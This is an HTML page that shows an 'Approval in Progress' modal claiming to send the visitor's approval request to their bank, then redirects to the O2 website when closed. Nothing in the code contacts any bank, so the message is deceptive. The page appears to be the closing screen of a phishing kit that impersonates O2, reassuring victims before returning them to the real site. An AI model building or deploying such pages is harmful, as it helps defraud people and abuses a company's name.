<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Approval Modal</title>
  <style>
    /* Reset margin and padding */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    /* Modal Background */
    .modal {
      display: none; /* Initially hidden */
      position: fixed;
      z-index: 1;
      left: 0;
      top: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.4);
      overflow: auto;
      transition: opacity 0.3s ease-in-out;
      opacity: 0; /* Start hidden */
    }

    /* Modal Content */
    .modal-content {
      background-color: #fff;
      margin: 10vh auto; /* Center modal vertically */
      padding: 2em;
      border-radius: 10px;
      width: 90%;
      max-width: 500px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
      text-align: center;
      animation: fadeIn 0.5s ease-in-out;
    }

    /* Close Button */
    .close {
      color: #aaa;
      font-size: 2em;
      font-weight: bold;
      position: absolute;
      top: 0.5em;
      right: 1em;
      cursor: pointer;
      transition: color 0.3s ease;
    }

    .close:hover,
    .close:focus {
      color: #000;
    }

    /* Loader Style */
    .loader-container {
      margin: 20px 0;
      display: flex;
      justify-content: center;
    }

    .loader {
      border: 8px solid #f3f3f3;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
    }

    /* Button */
    .rounded-button {
      padding: 1em 2em;
      background-color: #3498db;
      color: #fff;
      border: none;
      border-radius: 25px;
      font-size: 1rem;
      cursor: pointer;
      transition: background-color 0.3s ease;
      width: 100%;
      max-width: 200px; /* Limit the button size */
      margin-top: 1em;
    }

    .rounded-button:hover {
      background-color: #2980b9;
    }

    /* Animation for Modal Fade In */
    @keyframes fadeIn {
      0% {
        opacity: 0;
        transform: translateY(-30px);
      }
      100% {
        opacity: 1;
        transform: translateY(0);
      }
    }

    /* Animation for Spinner */
    @keyframes spin {
      0% {
        transform: rotate(0deg);
      }
      100% {
        transform: rotate(360deg);
      }
    }

    /* Responsive Design for Small Devices */
    @media (max-width: 768px) {
      .modal-content {
        padding: 1.5em;
        width: 90%;
        margin-top: 15vh;
      }

      .close {
        font-size: 1.5em;
      }

      .loader {
        width: 40px;
        height: 40px;
      }

      .rounded-button {
        font-size: 0.9rem;
        padding: 0.8em 1.5em;
      }
    }

    @media (max-width: 480px) {
      .modal-content {
        padding: 1.2em;
        width: 90%;
        margin-top: 20vh;
      }

      .close {
        font-size: 1.2em;
      }

      .loader {
        width: 35px;
        height: 35px;
      }

      .rounded-button {
        font-size: 0.8rem;
        padding: 0.7em 1.2em;
      }
    }
  </style>
</head>
<body>

  <!-- Approval Modal -->
  <div id="approvalModal" class="modal">
    <div class="modal-content">
      <span class="close" aria-label="Close">Ã—</span>
      <h2>Approval in Progress</h2>
      <p>We are sending your approval request to your bank.<br>Please wait while we process it...</p>
      <div class="loader-container">
        <div class="loader"></div>
      </div>
      <button id="closeButton" class="rounded-button">Close</button>
    </div>
  </div>

  <script>
    // Get the modal and button elements
    const modal = document.getElementById("approvalModal");
    const closeButton = document.getElementById("closeButton");
    const closeIcon = document.querySelector(".close");

    // Open the modal
    function openModal() {
      modal.style.display = "block"; // Show modal
      setTimeout(() => {
        modal.style.opacity = "1"; // Fade in effect
      }, 100); // Wait a little before applying opacity
    }

    // Close the modal and redirect to another URL
    function closeModalAndRedirect() {
      modal.style.opacity = "0"; // Fade out effect

      // Wait for the fade-out effect to complete before hiding the modal and redirecting
      setTimeout(() => {
        modal.style.display = "none"; // Hide modal completely
        window.location.href = "https://www.o2.co.uk/"; // Replace with your desired URL
      }, 300); // Wait for fade-out to finish
    }

    // Add event listeners to close the modal and redirect
    closeButton.addEventListener("click", closeModalAndRedirect);
    closeIcon.addEventListener("click", closeModalAndRedirect);

    // Close modal if clicked outside of it
    window.addEventListener("click", (event) => {
      if (event.target === modal) {
        closeModalAndRedirect();
      }
    });

    // Example to open the modal (optional, can be triggered based on your app logic)
    openModal();
  </script>

</body>
</html>
